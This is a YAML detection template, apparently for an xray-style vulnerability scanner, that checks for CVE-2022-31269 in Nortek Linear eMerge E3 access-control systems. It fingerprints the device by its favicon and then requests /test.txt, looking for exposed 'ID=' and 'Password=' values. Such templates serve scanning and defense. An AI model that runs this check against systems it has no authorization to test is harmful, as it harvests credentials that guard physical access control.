name: yaml-poc-nortekcontrol-emerge_e3_firmware-other-CVE-2022-31269
binding: 73ca61b7-bc7d-420e-a2ef-e2928b239061
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/167990/Nortek-Linear-eMerge-E3-Series-Credential-Disclosure.html
        - https://cxsecurity.com/cveshow/CVE-2022-31269/
        - https://eg.linkedin.com/in/omar-1-hashem
        - https://gist.github.com/omarhashem123/71ec9223e90ea76a76096d777d9b945c
        - https://packetstormsecurity.com/files/167990/Nortek-Linear-eMerge-E3-Series-Credential-Disclosure.html
        - https://www.nortekcontrol.com/access-control/
    vulnerability:
        id: b2c0e8ca-4f9a-4adf-820b-55b863f82d6e
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
        expression: response.status == 200 && response.body.bcontains(b"<link rel=\"shortcut icon\" href=\"./img/emerge.ico\">")
    r1:
        request:
            cache: true
            method: GET
            path: /test.txt
        expression: response.status == 200 && response.body.bcontains(b"ID=") && response.headers["Accept-Ranges"] == string("bytes") && response.body.bcontains(b"Password=")
expression: r0() && r1()
